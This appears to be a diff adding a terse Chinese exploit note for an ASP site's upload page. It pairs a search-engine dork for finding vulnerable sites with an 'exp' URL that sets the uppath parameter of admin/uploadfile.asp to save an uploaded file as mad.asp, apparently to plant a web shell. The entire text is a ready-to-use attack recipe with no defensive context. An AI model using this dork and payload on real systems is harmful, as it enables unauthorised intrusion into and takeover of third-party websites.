@@ -1,0 +1,4 @@
+关键字：inurl:newslist.asp?NodeCode=
+原始目录：http://127.0.0.1/uploadfile.asp?uppath=PicPath&upname=&uptext=form1.PicPath
+
+exp：http://127.0.0.1/admin/uploadfile.asp?uppath=mad.asp&upname=&uptext=form1.mad.asp
